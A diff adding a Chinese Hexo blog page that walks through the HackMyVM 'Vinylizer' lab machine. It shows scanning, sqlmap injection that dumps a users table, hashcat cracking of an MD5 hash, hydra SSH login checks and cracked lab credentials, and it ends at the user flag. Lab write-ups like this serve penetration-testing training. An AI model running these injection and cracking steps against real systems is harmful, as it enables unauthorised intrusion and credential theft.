@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://gcore.jsdelivr.net'>
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin>
+  <link rel='dns-prefetch' href='//unpkg.com'>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>HackMyVM: Vinylizer - BLOG</title>
+
+  
+    <meta name="description" content="一个入门级别的靶机，涵盖登陆界面sql注入漏洞，密码破解，可写入权限查询，sudo -l大法等等一系列常规操作。帮助巩固渗透测试技术的知识以及渗透利用链。快来看看🎱">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackMyVM: Vinylizer">
+<meta property="og:url" content="https://44maker.github.io/2024/02/07/hmv-Vinylizer/index.html">
+<meta property="og:site_name" content="BLOG">
+<meta property="og:description" content="一个入门级别的靶机，涵盖登陆界面sql注入漏洞，密码破解，可写入权限查询，sudo -l大法等等一系列常规操作。帮助巩固渗透测试技术的知识以及渗透利用链。快来看看🎱">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207112926323-386308.jpg">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207113136862-52204134.jpg">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207114123995-468193718.jpg">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207115110192-556750321.jpg">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207122251136-1832646450.jpg">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207123217593-327781933.jpg">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207125831003-629277432.jpg">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207131130737-1334994172.jpg">
+<meta property="article:published_time" content="2024-02-07T02:56:58.000Z">
+<meta property="article:modified_time" content="2024-02-07T05:24:38.723Z">
+<meta property="article:author" content="44maker">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="HackMyVM">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207112926323-386308.jpg">
+  
+  
+  
+  <meta name="keywords" content="渗透测试,HackMyVM">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="BLOG" type="application/atom+xml">
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="https://cdn-fusion.imgimg.cc/i/2024/68d83d25ef9fbeca.png">
+  
+
+  
+
+  
+
+
+  
+    
+      <link rel="stylesheet" href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.6.0/lxgwwenkaiscreen.css" media="print" onload="this.media='all'">
+    
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://cdn-fusion.imgimg.cc/i/2024/a2940be08601cf50.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">BLOG</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/friends/">友链</a><a class="nav-item" href="/nav/">导航</a></nav>
+</header>
+
+
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/blog/" placeholder="文章搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc"><div class="widget-header cap dis-select"><span class="name">HackMyVM: Vinylizer</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#IP%E4%BF%A1%E6%81%AF"><span class="toc-text">IP信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3"><span class="toc-text">端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLi"><span class="toc-text">SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="toc-text">破解密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE"><span class="toc-text">验证用户凭据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E8%BF%9B%E5%85%A5Root-Shell"><span class="toc-text">修改文件进入Root Shell</span></a></li></ol></div></div></widget>
+
+
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/44maker" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/social/08a41b181ce68.svg"/></a><a class="social" href="mailto:44maker_01@proton.me" rel="noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/social/a1b00e20f425d.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/">靶场笔记</a></div><div id="post-meta">发布于&nbsp;<time datetime="2024-02-07T02:56:58.000Z">2024-02-07</time></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>HackMyVM: Vinylizer</span></h1>
+<p>一个入门级别的靶机，涵盖登陆界面sql注入漏洞，密码破解，可写入权限查询，sudo -l大法等等一系列常规操作。帮助巩固渗透测试技术的知识以及渗透利用链。快来看看🎱</p>
+<span id="more"></span>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm=Vinylizer">https://hackmyvm.eu/machines/machine.php?vm=Vinylizer</a></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="IP信息"><a href="#IP信息" class="headerlink" title="IP信息"></a>IP信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~/Vinylizer </span><br><span class="line">➜ sudo arp-scan -l </span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 08:00:27:21:b1:d0, IPv4: 10.0.1.13</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">10.0.1.3        08:00:27:89:1e:e0       PCS Systemtechnik GmbH</span><br><span class="line">10.0.1.19       08:00:27:6d:ec:17       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">2 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned <span class="keyword">in</span> 1.998 seconds (128.13 hosts/sec). 2 responded</span><br></pre></td></tr></table></figure>
+<h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>使用Rustscan扫描端口信息</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">~/Vinylizer </span><br><span class="line">➜ sudo rustscan -t 1500 -b 1500 --ulimit 65000 -a 10.0.1.19 -- -sV -sC --script &quot;vuln&quot; -oA ports     </span><br><span class="line">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.         </span><br><span class="line">| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |         </span><br><span class="line">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |         </span><br><span class="line">`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;         </span><br><span class="line">The Modern Day Port Scanner. </span><br><span class="line">________________________________________ </span><br><span class="line">: https://discord.gg/GFrQsGy           : </span><br><span class="line">: https://github.com/RustScan/RustScan : </span><br><span class="line"> --------------------------------------  </span><br><span class="line">Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan         </span><br><span class="line">   </span><br><span class="line">[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;  </span><br><span class="line">[~] Automatically increasing ulimit value to 65000.  </span><br><span class="line">Open 10.0.1.19:80          </span><br><span class="line">Open 10.0.1.19:22          </span><br><span class="line">[~] Starting Script(s)     </span><br><span class="line">...</span><br><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.0.1.19</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://10.0.1.19:80/login.php</span><br><span class="line">|     Form id: username</span><br><span class="line">|_    Form action: login.php</span><br><span class="line">|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#x27;t find wp-login.php</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /login.php: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /login.php: Possible admin folder</span><br><span class="line">|_  /img/: Potentially interesting directory w/ listing on &#x27;apache/2.4.52 (ubuntu)&#x27;</span><br><span class="line">|_http-jsonp-detection: Couldn&#x27;t find any JSONP endpoints.</span><br><span class="line">MAC Address: 08:00:27:6D:EC:17 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<p>根据扫描结果可以看出80端口存在一个login.php，id是username，那么明确存在登录界面，还有一个&#x2F;img&#x2F;目录，应该存放网站所需要的图片，可能有图片隐写<br>信息格式化处理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf ports.gnmap ports.xml</span><br><span class="line"><span class="built_in">cat</span> ports.nmap | grep open | awk -F<span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">paste</span> -s -d <span class="string">&#x27;,&#x27;</span> | sed <span class="string">&#x27;s/,$//&#x27;</span></span><br><span class="line">------</span><br><span class="line">输出-&gt;22,80</span><br></pre></td></tr></table></figure>
+<p>既然开放了80端口那就打开网页看一下</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207112926323-386308.jpg" fancybox="true"/></div></div>
+<p>在页面上进行点击尝试后发现一个<code>Login</code>，即登录页面</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207113136862-52204134.jpg" fancybox="true"/></div></div>
+<p><code>login.php</code>确定了网站使用的是php，所以枚举一下网站目录</p>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.0.1.19 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,zip,tar</span><br></pre></td></tr></table></figure>
+<p>记录</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">~/Vinylizer </span><br><span class="line">➜ gobuster dir -u http://10.0.1.19 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,zip,tar</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.0.1.19</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,zip,tar</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/login.php            (Status: 200) [Size: 1408]</span><br><span class="line">/img                  (Status: 301) [Size: 304] [--&gt; http://10.0.1.19/img/]</span><br><span class="line">Progress: 150000 / 150005 (100.00%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+<p>和Rustscan得出的结果一致，目前可以发现只有两个路径</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207114123995-468193718.jpg" fancybox="true"/></div></div>
+<p>这里的图片可以下载下来，验证是否存在图片隐写</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">~/Vinylizer </span><br><span class="line">➜ exiftool *.png</span><br><span class="line">======== vinyl1.png</span><br><span class="line">ExifTool Version Number         : 12.67</span><br><span class="line">File Name                       : vinyl1.png</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 745 kB</span><br><span class="line">File Modification Date/Time     : 2024:01:20 09:01:17-05:00</span><br><span class="line">File Access Date/Time           : 2024:02:06 22:42:55-05:00</span><br><span class="line">File Inode Change Date/Time     : 2024:02:06 22:42:39-05:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : PNG</span><br><span class="line">File Type Extension             : png</span><br><span class="line">MIME Type                       : image/png</span><br><span class="line">Image Width                     : 1022</span><br><span class="line">Image Height                    : 634</span><br><span class="line">Bit Depth                       : 8</span><br><span class="line">Color Type                      : RGB with Alpha</span><br><span class="line">Compression                     : Deflate/Inflate</span><br><span class="line">Filter                          : Adaptive</span><br><span class="line">Interlace                       : Noninterlaced</span><br><span class="line">Image Size                      : 1022x634</span><br><span class="line">Megapixels                      : 0.648</span><br><span class="line">======== vinyl2.png</span><br><span class="line">ExifTool Version Number         : 12.67</span><br><span class="line">File Name                       : vinyl2.png</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 661 kB</span><br><span class="line">File Modification Date/Time     : 2024:01:20 09:01:17-05:00</span><br><span class="line">File Access Date/Time           : 2024:02:06 22:42:55-05:00</span><br><span class="line">File Inode Change Date/Time     : 2024:02:06 22:42:43-05:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : PNG</span><br><span class="line">File Type Extension             : png</span><br><span class="line">MIME Type                       : image/png</span><br><span class="line">Image Width                     : 1022</span><br><span class="line">Image Height                    : 634</span><br><span class="line">Bit Depth                       : 8</span><br><span class="line">Color Type                      : RGB with Alpha</span><br><span class="line">Compression                     : Deflate/Inflate</span><br><span class="line">Filter                          : Adaptive</span><br><span class="line">Interlace                       : Noninterlaced</span><br><span class="line">Image Size                      : 1022x634</span><br><span class="line">Megapixels                      : 0.648</span><br><span class="line">    2 image files <span class="built_in">read</span></span><br></pre></td></tr></table></figure>
+<p>因为是png文件，再用zsteg探测一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜ zsteg *.png      </span><br><span class="line">[.] vinyl1.png</span><br><span class="line">[=] nothing :(                    </span><br><span class="line"></span><br><span class="line">[.] vinyl2.png</span><br><span class="line">imagedata           .. text: <span class="string">&quot;X48@X08@W19&quot;</span></span><br><span class="line">[=] nothing :(   </span><br></pre></td></tr></table></figure>
+<p><code>X48@X08@W19</code>这个字符串可能是密码这里进行保留</p>
+<h1 id="立足点"><a href="#立足点" class="headerlink" title="立足点"></a>立足点</h1><p>那么回到login.php中发现是有登录界面<br><code>http://10.0.1.19/login.php#register</code><br>无法注册，那么用burpsuite抓包检查登录过程的信息</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207115110192-556750321.jpg" fancybox="true"/></div></div>
+<p>爆破用户名和密码是<code>下下策</code></p>
+<h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><p>我们尝试一下是否存在sql注入，将POST请求复制粘贴到一个文件中<br>使用sqlmap进行探测数据库信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~/Vinylizer                              </span><br><span class="line">➜ sqlmap -r req -o --dbs                 </span><br><span class="line">available databases [3]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] vinyl_marketplace</span><br></pre></td></tr></table></figure>
+<p>根据sqlmap的报告，该网站存在sql注入漏洞（时间盲注），且username是一个注入点<br><code>vinyl_marketplace</code>这是我们感兴趣的数据库<br>再进行表单枚举</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜ sqlmap -r req -o -D vinyl_marketplace -tables</span><br><span class="line">[1 table]</span><br><span class="line">+-------+</span><br><span class="line">| <span class="built_in">users</span> |</span><br><span class="line">+-------+</span><br><span class="line">➜ sqlmap -r req -o -D vinyl_marketplace -T <span class="built_in">users</span> --columns --dump   </span><br><span class="line">+----+----------------------------------+-----------+----------------+</span><br><span class="line">| <span class="built_in">id</span> | password                         | username  | login_attempts |</span><br><span class="line">+----+----------------------------------+-----------+----------------+</span><br><span class="line">| 1  | 9432522ed1a8fca612b11c3980a031f6 | shopadmin | 0              |</span><br><span class="line">| 2  | password123                      | lana      | 0              |</span><br><span class="line">+----+----------------------------------+-----------+----------------+</span><br></pre></td></tr></table></figure>
+<p>shopadmin的密码是一串hash<code>9432522ed1a8fca612b11c3980a031f6</code>，应该是md5加密，尝试使用john&#x2F;hashcat或者网站破解</p>
+<h2 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h2><p><a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207122251136-1832646450.jpg" fancybox="true"/></div></div>
+<p>或者使用hashcat</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/Vinylizer                </span><br><span class="line">➜ hashcat  -a 0 -m 0 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br><span class="line">shopadmin:addicted2vinyl</span><br></pre></td></tr></table></figure>
+<p>数据库用户凭证</p>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>shopadmin</td>
+<td>addicted2vinyl</td>
+</tr>
+<tr>
+<td>lana</td>
+<td>password123</td>
+</tr>
+</tbody></table>
+<h3 id="验证用户凭据"><a href="#验证用户凭据" class="headerlink" title="验证用户凭据"></a>验证用户凭据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P password.txt ssh://10.0.1.19</span><br></pre></td></tr></table></figure>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://img2023.cnblogs.com/blog/3273817/202402/3273817-20240207123217593-327781933.jpg" fancybox="true"/></div></div>
+<p>搞定！SSH连上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shopadmin@vinylizer:~$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">shopadmin@vinylizer:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">I************5</span><br></pre></td></tr></table></figure>
